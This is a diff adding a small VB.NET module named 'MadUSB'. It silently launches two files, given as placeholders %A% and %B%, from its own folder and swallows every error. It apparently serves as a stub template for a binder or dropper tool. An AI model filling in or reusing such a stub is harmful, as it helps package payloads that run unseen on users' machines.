@@ -1,0 +1,17 @@
+Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection
+
+<Assembly: AssemblyCopyright("%C%")> 
+
+Module MadUSB
+Sub Main()
+
+Try
+Start(StartupPath & "\" & "%A%")
+Catch : End Try
+
+Try
+Start(StartupPath & "\" & "%B%")
+Catch : End Try
+
+End Sub
+End Module
